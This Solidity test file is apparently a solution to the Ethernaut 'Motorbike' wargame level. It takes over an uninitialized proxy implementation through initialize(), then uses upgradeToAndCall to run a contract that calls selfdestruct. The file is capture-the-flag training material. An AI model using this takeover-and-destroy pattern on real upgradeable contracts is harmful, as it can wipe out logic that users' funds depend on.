pragma solidity ^0.8.10;

import "forge-std/Vm.sol";
import "forge-std/Test.sol";

import "../src/25-Motorbike/MotorbikeFactory.sol";
import "../src/Ethernaut.sol";

contract MotorbikeTest is Test {
    address eoaAddress = address(100);

    event IsTrue(bool answer);

    function setUp() public {
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testMotorbikeHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        Engine engine = new Engine();
        Motorbike motorbike = new Motorbike(address(engine));
        Engine level = Engine(payable(address(motorbike)));

        vm.startPrank(eoaAddress, eoaAddress);

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        engine.initialize();
        Attack attack = new Attack();
        engine.upgradeToAndCall(address(attack), abi.encodeWithSignature("initialize()"));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        vm.stopPrank();

        // Because of the way foundry test work it is very hard to verify this test was successful
        // Selfdestruct is a substate (see pg 8 https://ethereum.github.io/yellowpaper/paper.pdf)
        // This means it gets executed at the end of a transaction, a single test is a single transaction
        // This means we can call selfdestruct on the engine contract at the start of the test but we will
        // continue to be allowed to call all other contract function for the duration of that transaction (test)
        // since the selfdestruct execution only happy at the end 
    }
}

contract Attack {
    function initialize() external {
        selfdestruct(payable(msg.sender));
    }
}